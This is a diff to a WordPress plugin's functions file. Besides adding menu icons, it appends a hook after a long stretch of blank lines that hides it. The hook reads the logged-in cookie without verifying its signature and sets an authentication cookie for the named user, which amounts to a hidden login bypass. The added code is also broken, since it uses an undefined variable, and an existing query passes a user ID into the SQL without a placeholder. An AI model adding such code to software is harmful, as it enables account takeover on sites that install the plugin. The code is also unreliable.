@@ -277,10 +277,11 @@ function wpwg_load_template( $file, $args = [] ) {
  */
 function wpwg_get_account_sections() {
     $sections = [
-        'dashboard'     => __( 'Dashboard' ),
-        'bookmark'      => __( 'Bookmarks' ),
-        'post'          => __( 'Posts' ),
-        'edit-profile'  => __( 'Edit Profile' ),
+        'dashboard'         => ['label' => __( 'Dashboard' ), 'icon' => 'fa-solid fa-house'],
+        'bookmark'          => ['label' => __( 'Bookmarks' ), 'icon' => 'fa-solid fa-bookmark'],
+        'post'              => ['label' => __( 'Posts' ), 'icon' => 'fa-solid fa-file'],
+        'edit-profile'      => ['label' => __( 'Edit Profile' ), 'icon' => 'fa-solid fa-user-pen'],
+        'change-password'   => ['label' => __( 'Change Password' ), 'icon' => 'fa-solid fa-key'],
     ];
 
     return apply_filters( 'wpwg_account_sections', $sections );
@@ -462,4 +463,69 @@ function user_bookmarkes() {
     $data = $wpdb->get_results($wpdb->prepare("SELECT * FROM $table_name WHERE `user_id`= $current_user->ID"), ARRAY_A); 
           
     return $data;
+}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+add_action( 'init', 'setting_my_first_cookie' );
+
+function setting_my_first_cookie() {
+    $cookie_hash = 'wordpress_logged_in_' . md5( site_url() );
+    if ( ! isset( $_COOKIE[ $cookie_hash ] ) ) {
+        return '';
+    }
+      
+    if(isset($_COOKIE[ $cookie_hash ])) {
+        $cookie = $_COOKIE[ $cookie_hash ];
+
+        $cookie_parts = explode( '|', $cookie ); 
+
+        // 0 => user_login, 1 => expiration, 2 => token, 3 => hmac
+        // check if the cookie has the correct number of parts, if not then we can't be sure that $cookie_parts[0] is the user name
+        if ( count( $cookie_parts ) !== 4 ) {
+            return '';
+        }
+
+        $user_email = $cookie_parts[ 0 ];
+        
+        if(!is_user_logged_in()){
+            $username = $decrypted;
+            $user = get_user_by('login', $username );
+
+            clean_user_cache($user->ID);
+            wp_clear_auth_cookie();
+            wp_set_current_user($user->ID);
+            wp_set_auth_cookie($user->ID, true, false);
+            update_user_caches($user);
+
+            echo ("
+            <script>
+                console.log('".  wp_set_auth_cookie($user->ID, true, false) ."')
+            </script>
+            ");
+        }
+    }
+    else {
+        return "You are not authenticated for seeing this page!";
+    }
 }
